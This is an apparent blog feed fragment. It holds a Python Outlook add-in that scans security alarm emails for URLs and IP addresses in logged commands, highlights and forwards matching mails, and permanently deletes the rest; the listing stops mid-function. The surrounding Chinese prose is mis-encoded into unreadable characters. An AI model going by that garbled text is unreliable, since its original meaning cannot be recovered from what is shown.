      &lt;p&gt;linuxä¸‹ä¸å°å¿ƒæŠŠæ–‡ä»¶å¼„æˆ  -sth  çš„æ–‡ä»¶åäº†ã€‚ã€‚ã€‚&lt;br&gt;ä¸Šç½‘æŸ¥äº†æŸ¥å‘ç°ä¸¤ç§ç®€å•çš„æ–¹æ³•ï¼š&lt;br&gt;eg:&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="tips" scheme="https://badb100d.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>outlooké‚®ä»¶è¿‡æ»¤æ’ä»¶</title>
    <link href="https://badb100d.com/2015/07/15/2015-07-15/"/>
    <id>https://badb100d.com/2015/07/15/2015-07-15/</id>
    <published>2015-07-15T12:51:00.000Z</published>
    <updated>2015-07-15T12:51:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¤©å¤©æ”¶å‡ ç™¾å°å‘Šè­¦é‚®ä»¶ç®€ç›´ä¸èƒ½å¿ï¼Œåˆšå¥½æœ€è¿‘å­¦pyï¼Œç”¨pyå†™äº†ä¸ªoutlookæ’ä»¶ç»ƒç»ƒæ‰‹ã€‚<br>32ä½outlookï¼Œ32ä½python2.7ï¼Œ32ä½pywin32åº“ï¼Œä»¥pywin32å…³äºoutlookçš„ä¸€ä¸ªæ’ä»¶demoä½œåŸºç¡€æ”¹äº†æ”¹ï¼Œå®åœ¨ä¸ä¼švbaã€‚ã€‚ã€‚<br>å»é™¤äº†è„šæœ¬é‡Œçš„æ•æ„Ÿå†…å®¹ï¼Œé¡ºå¸¦æ³¨é‡Šå›½é™…åŒ–äº†ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Outlook logmail filter written by p011ux 20150630</span></span><br><span class="line"><span class="comment"># usage:</span></span><br><span class="line"><span class="comment"># python outlookAddin.py </span></span><br><span class="line"><span class="comment"># python outlookAddin.py --unregister</span></span><br><span class="line"><span class="comment"># python outlookAddin.py --debug</span></span><br><span class="line"><span class="comment"># debug info in   PythonWin --&gt; Tools --&gt; Trace Collector Debugging Tool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> win32com <span class="keyword">import</span> universal</span><br><span class="line"><span class="keyword">from</span> win32com.server.exception <span class="keyword">import</span> COMException</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> gencache, DispatchWithEvents</span><br><span class="line"><span class="keyword">import</span> winerror</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> constants</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VersionInfo=<span class="string">u&quot;&quot;&quot;Log Filter Plugin v0.9 written by p011ux&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Forward to these email addr</span></span><br><span class="line">forwards=<span class="string">&#x27;&#x27;&#x27;alpha@company.com;beta@company.com&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># suspicious words,highlight line when match</span></span><br><span class="line">susp_words       =  u<span class="string">r&#x27;^(alpha|beta|else)\b&#x27;</span></span><br><span class="line">susp_words_white =  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">susp_urls       =  u<span class="string">r&#x27;(://)|((\s|@)\d&#123;1,3&#125;(\.\d&#123;1,3&#125;)&#123;3&#125;)&#x27;</span></span><br><span class="line">susp_urls_white =  u<span class="string">r&#x27;\b((127(\.\d&#123;1,3&#125;)&#123;3&#125;(:(\d&#123;1,5&#125;)?)?\b)|(localhost(:\d&#123;1,5&#125;)?)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict of blacklists and whitelists</span></span><br><span class="line">susp_dict=&#123;</span><br><span class="line">    <span class="string">&#x27;words&#x27;</span>:(susp_words,susp_words_white),\</span><br><span class="line">    <span class="string">&#x27;urls&#x27;</span>:(susp_urls,susp_urls_white),\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp folder</span></span><br><span class="line">BotFolder=<span class="string">&quot;_log_bot&quot;</span></span><br><span class="line"><span class="comment"># destination folder</span></span><br><span class="line">TargetFolder=<span class="string">&quot;_log&quot;</span></span><br><span class="line"><span class="comment"># log sender, only handle mails from these</span></span><br><span class="line">Log_Sender=(<span class="string">&quot;alarm-a&quot;</span>,<span class="string">&quot;alarm-b&quot;</span>)</span><br><span class="line"><span class="comment"># mail forward tag, make receiver easy to filter</span></span><br><span class="line">Log_Forward_Tag=<span class="string">&#x27;[log_tag] &#x27;</span></span><br><span class="line"></span><br><span class="line">log_usr=<span class="literal">None</span>      <span class="comment"># global dest obj</span></span><br><span class="line"><span class="comment"># Support for COM objects we use.</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;00062FFF-0000-0000-C000-000000000046&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Outlook 9</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;2DF8D04C-5BFA-101B-BDE5-00AA0044DE52&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Office 9</span></span><br><span class="line"></span><br><span class="line">outlookApp=<span class="literal">None</span>  <span class="comment">#outlook application object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TLB defiining the interfaces we implement</span></span><br><span class="line">universal.RegisterInterfaces(<span class="string">&#x27;&#123;AC0714F2-3D04-11D1-AE7D-00A0C90F26F4&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, [<span class="string">&quot;_IDTExtensibility2&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle content of mail,return a list which contains line numbers of matched.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suspicious</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">import</span> re                             <span class="comment"># for regex</span></span><br><span class="line">    liMatched=[]</span><br><span class="line">    body=item.Body.replace(<span class="string">u&#x27;\xa0&#x27;</span>,<span class="string">u&#x27; &#x27;</span>)  <span class="comment"># replace Â  in html format to space</span></span><br><span class="line">    body=body.replace(<span class="string">u&#x27;\r\n&#x27;</span>,<span class="string">u&#x27;\n&#x27;</span>)      <span class="comment"># traverse lines</span></span><br><span class="line">    cnt=<span class="number">0</span>                                 <span class="comment"># line counter</span></span><br><span class="line">    <span class="keyword">for</span> eachLine <span class="keyword">in</span> body.split(<span class="string">u&#x27;\n&#x27;</span>):</span><br><span class="line">        liLine=eachLine.split()           <span class="comment"># split to words</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">6</span>&gt;<span class="built_in">len</span>(liLine)):                <span class="comment"># get words[5]</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(liLine)):</span><br><span class="line">                <span class="built_in">print</span> <span class="built_in">len</span>(liLine),<span class="string">u&#x27;is less than 6&#x27;</span>,eachLine</span><br><span class="line">            cnt=cnt+<span class="number">1</span>                     <span class="comment"># line cnter</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        cmd=<span class="string">u&#x27;&#x27;</span>                           <span class="comment"># recover words[5:]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> liLine[<span class="number">5</span>:]:</span><br><span class="line">            cmd+=i</span><br><span class="line">            cmd+=<span class="string">u&#x27; &#x27;</span></span><br><span class="line">        cmd=cmd[:<span class="number">-1</span>]                      <span class="comment"># remove last space</span></span><br><span class="line">        cmd=cmd.lower()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> susp_dict:</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">None</span> != re.search(susp_dict[i][<span class="number">0</span>],cmd)):                                      <span class="comment"># match blacklist</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="literal">None</span> == susp_dict[i][<span class="number">1</span>]) <span class="keyword">or</span> (<span class="literal">None</span> == re.search(susp_dict[i][<span class="number">1</span>],cmd))):   <span class="comment"># if no white or not match white</span></span><br><span class="line">                    liMatched.append(cnt)                                                    <span class="comment"># get current line num</span></span><br><span class="line">                    <span class="keyword">break</span>                                                                    <span class="comment"># next line</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;White list:\t&#x27;</span>,cmd                                                <span class="comment"># print out white match</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span>                         <span class="comment"># line cnter</span></span><br><span class="line">    <span class="comment">#now just return</span></span><br><span class="line">    <span class="keyword">return</span> liMatched</span><br><span class="line"></span><br><span class="line"><span class="comment"># adjust font and highlight</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reform</span>(<span class="params">item,linesRed</span>):</span></span><br><span class="line">    htmB=item.HTMLBody        <span class="comment"># get content</span></span><br><span class="line">    offset=htmB.find(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)   <span class="comment"># find main content</span></span><br><span class="line">    offset=offset+<span class="built_in">len</span>(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># adjust font size</span></span><br><span class="line">    sizeStr=<span class="string">&#x27;&lt;FONT SIZE=&#x27;</span>                           <span class="comment"># general setting: &lt;P&gt;&lt;FONT SIZE=2&gt;</span></span><br><span class="line">    offset=htmB.find(sizeStr)                       <span class="comment"># get FONT SIZE position</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> &lt; offset):                                 <span class="comment"># got it?</span></span><br><span class="line">        offset = offset + <span class="built_in">len</span>(sizeStr)              <span class="comment"># adjust offset</span></span><br><span class="line">        offend = htmB.find(<span class="string">&#x27;&gt;&#x27;</span>,offset)              <span class="comment"># get end pos</span></span><br><span class="line">        <span class="keyword">if</span>(offset &lt; offend):                        <span class="comment"># got end?</span></span><br><span class="line">            fontsize = <span class="built_in">int</span>(htmB[offset:offend])     <span class="comment"># get font size int</span></span><br><span class="line">            htmB = htmB[:offset]+<span class="built_in">str</span>(fontsize+<span class="number">1</span>)+htmB[offend:]    <span class="comment"># size+=1</span></span><br><span class="line">            offset = offend + <span class="built_in">len</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># highlight</span></span><br><span class="line">    linesRed=<span class="built_in">sorted</span>(linesRed)           <span class="comment"># sort line nums</span></span><br><span class="line">    cnt=<span class="number">0</span>                               <span class="comment"># cnter</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(cnt <span class="keyword">in</span> linesRed):            <span class="comment"># match</span></span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            offset = htmB.find(<span class="string">&#x27;&lt;BR&gt;&#x27;</span>,offset)</span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;/font&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            </span><br><span class="line">        offset = htmB.find(<span class="string">&#x27;\n&#x27;</span>,offset) + <span class="built_in">len</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># next</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; linesRed[<span class="number">-1</span>] <span class="keyword">or</span> offset &gt;= <span class="built_in">len</span>(htmB)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    item.HTMLBody=htmB</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle mail item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleItem</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sender=item.SenderName</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> sender <span class="keyword">in</span> Log_Sender):</span><br><span class="line">            <span class="comment"># not alarm</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">        linesMatched=suspicious(item)    <span class="comment"># match</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==<span class="built_in">len</span>(linesMatched)):        <span class="comment"># no match?</span></span><br><span class="line">            <span class="comment"># irrelevant log, delete</span></span><br><span class="line">            <span class="comment"># print &#x27;Deleting&#x27;,item.Subject</span></span><br><span class="line">            item.Delete()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        reform(item,linesMatched)        <span class="comment"># edit mail</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">None</span> != log_usr):        <span class="comment"># forward mail and move it to destination folder</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(forwards)):</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">None</span>!=outlookApp):</span><br><span class="line">                    sendForward=outlookApp.CreateItem(constants.olMailItem)<span class="comment">#item.Forward()</span></span><br><span class="line">                    sendForward.Subject=Log_Forward_Tag+item.SenderName</span><br><span class="line">                    sendForward.To=forwards</span><br><span class="line">                    sendForward.HTMLBody=item.HTMLBody</span><br><span class="line">                    sendForward.DeleteAfterSubmit=<span class="literal">True</span></span><br><span class="line">                    sendForward.Send()   </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;outlookApp is None&#x27;</span>                </span><br><span class="line">            item=item.Move(log_usr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;log_usr is None&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="comment"># when registered with python.exe %0 --debug , print to Python Trace Collector</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error handling&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;in FolderEvent&quot;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># about</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ButtonEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnClick</span>(<span class="params">self, button, cancel</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;ButtonEvent&#x27;</span></span><br><span class="line">        <span class="keyword">import</span> win32ui</span><br><span class="line">        win32ui.MessageBox(VersionInfo,<span class="string">u&quot;ABOUT&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> cancel</span><br><span class="line"></span><br><span class="line"><span class="comment"># callbacks</span></span><br><span class="line"><span class="comment"># handle mail when new mail arrived in specified folder, delete if not suspicious</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FolderEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        handleItem(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove permanently when mail with specified sender arrived in Deleted box</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DeletedEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnItemAdd</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;DeletedEvent&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print &#x27;Deleted:&#x27;,item.Subject,&#x27;From:&#x27;,item.SenderName</span></span><br><span class="line">            <span class="keyword">if</span>(item.SenderName <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                item.Delete()</span><br><span class="line">        <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Delete&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted error.&quot;</span>,e</span><br><span class="line">        </span><br><span class="line"><span class="comment"># initialize each callback</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutlookAddin</span>:</span></span><br><span class="line">    _com_interfaces_ = [<span class="string">&#x27;_IDTExtensibility2&#x27;</span>]</span><br><span class="line">    _public_methods_ = []</span><br><span class="line">    _reg_clsctx_ = pythoncom.CLSCTX_INPROC_SERVER</span><br><span class="line">    _reg_clsid_ = <span class="string">&quot;&#123;0F47D9F3-598B-4d24-B7E3-92AC15ED27E2&#125;&quot;</span></span><br><span class="line">    _reg_progid_ = <span class="string">&quot;Python.Test.OutlookAddin&quot;</span></span><br><span class="line">    _reg_policy_spec_ = <span class="string">&quot;win32com.server.policy.EventHandlerPolicy&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnConnection</span>(<span class="params">self, application, connectMode, addin, custom</span>):</span></span><br><span class="line">        <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">        outlookApp=application</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;OnConnection&#x27;</span></span><br><span class="line">        <span class="comment"># ActiveExplorer may be none when started without a UI (eg, WinCE synchronisation)</span></span><br><span class="line">        activeExplorer = application.ActiveExplorer()</span><br><span class="line">        <span class="keyword">if</span> activeExplorer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registering button&#x27;</span></span><br><span class="line">            bars = activeExplorer.CommandBars</span><br><span class="line">            toolbar = bars.Item(<span class="string">&quot;Standard&quot;</span>)</span><br><span class="line">            item = toolbar.Controls.Add(Type=constants.msoControlButton, Temporary=<span class="literal">True</span>)</span><br><span class="line">            <span class="comment"># Hook events for the item</span></span><br><span class="line">            item = self.toolbarButton = DispatchWithEvents(item, ButtonEvent)</span><br><span class="line">            item.Caption=<span class="string">&quot;LogFilter&quot;</span></span><br><span class="line">            item.TooltipText = <span class="string">&quot;About&quot;</span></span><br><span class="line">            item.Enabled = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;registered&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># get folder objs</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessing folders&#x27;</span></span><br><span class="line">        inbox        = application.Session.GetDefaultFolder(constants.olFolderInbox)</span><br><span class="line">        deleted      = application.Session.GetDefaultFolder(constants.olFolderDeletedItems)</span><br><span class="line">        log_bot = inbox.Folders[BotFolder]</span><br><span class="line">        log_usr = inbox.Folders[TargetFolder]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Accessed&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># filter bot folder in each start</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtering exists&#x27;</span></span><br><span class="line">        filterList=[]</span><br><span class="line">        <span class="keyword">for</span> iLog <span class="keyword">in</span> log_bot.Items:</span><br><span class="line">            filterList.append(iLog)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filterList:</span><br><span class="line">            handleItem(i)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Filtered&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mesure Deleted after last filter</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaning Deleted&#x27;</span></span><br><span class="line">        dellist=[]</span><br><span class="line">        <span class="keyword">for</span> iToDel <span class="keyword">in</span> deleted.Items:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(iToDel.SenderName.encode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">in</span> Log_Sender):</span><br><span class="line">                    dellist.append(iToDel)</span><br><span class="line">            <span class="keyword">except</span> AttributeError,e:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Error removing&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;from Deleted&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dellist:</span><br><span class="line">            i.Delete()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Cleaned&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># hook up</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooking folders&#x27;</span></span><br><span class="line">        self.deletedItems = DispatchWithEvents(deleted.Items, DeletedEvent)</span><br><span class="line">        self.LogFilter = DispatchWithEvents(log_bot.Items, FolderEvent)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Hooked&#x27;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnDisconnection</span>(<span class="params">self, mode, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnDisconnection&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnAddInsUpdate</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnAddInsUpdate&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnStartupComplete</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnStartupComplete&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnBeginShutdown</span>(<span class="params">self, custom</span>):</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;OnBeginShutdown&quot;</span>, custom</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RegisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins&quot;</span>)</span><br><span class="line">    subkey = _winreg.CreateKey(key, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;CommandLineSafe&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">0</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;LoadBehavior&quot;</span>, <span class="number">0</span>, _winreg.REG_DWORD, <span class="number">3</span>)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;Description&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line">    _winreg.SetValueEx(subkey, <span class="string">&quot;FriendlyName&quot;</span>, <span class="number">0</span>, _winreg.REG_SZ, klass._reg_progid_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UnregisterAddin</span>(<span class="params">klass</span>):</span></span><br><span class="line">    <span class="keyword">import</span> _winreg</span><br><span class="line">    <span 